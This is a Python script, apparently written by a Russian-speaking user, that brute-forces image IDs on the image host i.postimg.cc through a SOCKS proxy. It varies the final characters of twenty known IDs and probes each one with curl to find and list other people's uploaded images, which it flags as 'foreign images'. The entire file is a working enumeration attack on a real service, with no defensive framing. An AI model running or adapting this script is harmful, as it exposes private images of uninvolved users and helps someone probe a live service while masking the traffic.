#!/usr/bin/env python3
"""image_neighbor_brute.py — брутит соседей image ID через AdGuard SOCKS."""
import subprocess, time, sys, itertools, string

# Image IDs from our session
SEED_IDS = ["Sx4HvbjF","13Sbj141","FHxwtCkC","4xGjSRnT","RZm2DxqB",
            "dV9gMNZf","HktFGv8P","jShBV3nF","YC7TsB0x","XYWtz6qs",
            "nhxNPfr0","RZm2Dxhd","y8K2bCxP","K8bCHhjV","g2p1TbjM",
            "9Q2snH0n","4xGjSRy0","XYWtz6qT","kgCLpPDr","6pKFmxqk"]

PROXY = "socks5h://127.0.0.1:1080"
BASE62 = string.digits + string.ascii_letters
RADIUS = 3  # ±3 on last char (62^3 options is too many, start small)

def check(gid):
    """Check if image exists at i.postimg.cc/ID/test.png"""
    try:
        r = subprocess.run([
            "curl", "-s", "-x", PROXY, "--max-time", "4",
            "-o", "/dev/null", "-w", "%{http_code}",
            f"https://i.postimg.cc/{gid}/test.png"
        ], capture_output=True, text=True, timeout=6)
        return gid, r.stdout.strip()
    except:
        return gid, "ERR"

# Generate neighbors: vary last char
neighbors = set()
for gid in SEED_IDS:
    prefix = gid[:7]
    current = gid[7]
    idx = BASE62.index(current)
    for offset in range(-RADIUS, RADIUS+1):
        if offset == 0:
            continue
        new_idx = (idx + offset) % 62
        new_gid = prefix + BASE62[new_idx]
        if new_gid not in SEED_IDS:
            neighbors.add(new_gid)

# For prefix-6 clusters, also vary 6th char
for gid in ["RZm2DxqB","RZm2Dxhd","4xGjSRnT","4xGjSRy0","XYWtz6qs","XYWtz6qT"]:
    prefix5 = gid[:5]
    for c6 in BASE62:
        for c7 in BASE62[:RADIUS*2+1]:  # limit 7th char radius too
            new_gid = prefix5 + c6 + c7
            if new_gid not in SEED_IDS:
                neighbors.add(new_gid)

neighbors = list(neighbors)[:500]
print(f"Testing {len(neighbors)} neighbors (radius={RADIUS})...")

found = []
for i, gid in enumerate(neighbors):
    gid, code = check(gid)
    if code == "200":
        found.append(gid)
        print(f"  [{i}] 🔴 FOUND: {gid} ← ЧУЖАЯ КАРТИНКА!")
    if (i+1) % 50 == 0:
        print(f"  {i+1}/{len(neighbors)} checked, {len(found)} found")
    time.sleep(0.05)  # small delay

print(f"\n{'='*50}")
print(f"Found {len(found)} foreign images!")
for gid in found:
    print(f"  https://i.postimg.cc/{gid}/")
